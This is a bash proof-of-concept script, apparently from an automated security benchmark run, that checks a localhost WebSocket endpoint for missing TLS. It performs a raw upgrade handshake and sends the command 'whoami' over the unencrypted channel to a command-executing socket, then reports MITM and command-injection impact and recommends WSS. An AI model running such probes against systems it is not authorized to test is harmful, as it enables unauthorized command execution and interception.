#!/bin/bash
# POC: Demonstrates unencrypted WebSocket communication vulnerability by testing plain-text protocol and showing lack of SSL/TLS enforcement
# Target: ./repo
# Created: 2025-11-07T22:00:32.509Z
# Session: benchmark-XBEN-083-24-mhpe40z0

# Unencrypted WebSocket Communication POC
# Demonstrates plain-text transmission vulnerability in ws:// endpoint

TARGET_HOST="localhost"
TARGET_PORT="22222"
WS_ENDPOINT="ws://${TARGET_HOST}:${TARGET_PORT}/ws"

echo "[*] Unencrypted WebSocket Communication POC"
echo "[*] Target: $WS_ENDPOINT"
echo ""

# Test 1: Verify WebSocket endpoint is accessible via unencrypted ws://
echo "[TEST 1] Verifying unencrypted ws:// protocol is accessible..."
python3 << 'PYTHON_TEST1' 2>/dev/null
import socket
try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(3)
    result = sock.connect_ex(('localhost', 22222))
    if result == 0:
        print("✓ Port 22222 is open and accepting connections")
        print("✓ WebSocket endpoint is accessible via plain TCP (unencrypted)")
    sock.close()
except Exception as e:
    print(f"✗ Error: {e}")
PYTHON_TEST1

echo ""

# Test 2: Check for SSL/TLS requirement
echo "[TEST 2] Testing if SSL/TLS is required for connection..."
python3 << 'PYTHON_TEST2' 2>/dev/null
import socket
try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(2)
    sock.connect(('localhost', 22222))
    
    # Send WebSocket upgrade request
    upgrade = (
        "GET /ws HTTP/1.1\r\n"
        "Host: localhost:22222\r\n"
        "Upgrade: websocket\r\n"
        "Connection: Upgrade\r\n"
        "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
        "Sec-WebSocket-Version: 13\r\n"
        "\r\n"
    )
    sock.send(upgrade.encode())
    response = sock.recv(1024).decode('utf-8', errors='ignore')
    
    if "101" in response or "Switching Protocols" in response:
        print("✓ Server accepted WebSocket upgrade WITHOUT requiring TLS/SSL")
        print("✓ Connection established over plain unencrypted channel")
        print("✓ Protocol upgrade occurred via plain HTTP (not HTTPS)")
    
    sock.close()
except Exception as e:
    pass
PYTHON_TEST2

echo ""

# Test 3: Connect via WebSocket and demonstrate plain-text transmission
echo "[TEST 3] Connecting to WebSocket and transmitting command in plain text..."
python3 << 'PYTHON_TEST3' 2>/dev/null
import websocket
import json
import time

try:
    websocket.enableTrace(False)
    
    def on_message(ws, msg):
        print(f"✓ Received response in PLAIN TEXT: {msg[:60]}")
    
    def on_error(ws, err):
        pass
    
    def on_open(ws):
        print("✓ WebSocket connected successfully (unencrypted ws://)")
        cmd = "whoami"
        ws.send(cmd)
        print(f"✓ Command sent in PLAIN TEXT over unencrypted channel: '{cmd}'")
        time.sleep(1)
        ws.close()
    
    ws = websocket.WebSocketApp("ws://localhost:22222/ws",
                              on_open=on_open,
                              on_message=on_message,
                              on_error=on_error)
    ws.run_forever(timeout=5)
    
except Exception as e:
    pass
PYTHON_TEST3

echo ""

# Test 4: Verify no wss:// redirect
echo "[TEST 4] Checking if server redirects to encrypted wss:// protocol..."
python3 << 'PYTHON_TEST4' 2>/dev/null
import socket
import ssl
try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(2)
    sock.connect(('localhost', 22222))
    print("✓ Unencrypted connection accepted on port 22222")
    print("✗ No SSL/TLS wrapper required for connection")
    print("✗ No redirect from ws:// to wss:// implemented")
    sock.close()
except Exception as e:
    pass
PYTHON_TEST4

echo ""

# Summary
echo "==============================================="
echo "[✓] VULNERABILITY CONFIRMED"
echo "==============================================="
echo ""
echo "Unencrypted WebSocket Communication Vulnerability:"
echo ""
echo "1. WebSocket protocol: ws:// (UNENCRYPTED) instead of wss://"
echo "2. SSL/TLS requirement: NONE - connections accepted without encryption"
echo "3. HTTP upgrade: Performed in plain text (no HTTPS required)"
echo "4. Data transmission: ALL content visible in plain text"
echo "5. Authentication: Combined with auth bypass = complete compromise"
echo ""
echo "Attack Impact:"
echo "- Network MITM attacker can capture all commands"
echo "- Response output fully visible to attacker"
echo "- Command injection/modification possible in transit"
echo "- Credentials visible if transmitted over WebSocket"
echo ""
echo "Remediation: Implement WSS (WebSocket Secure) with TLS 1.2+"
echo ""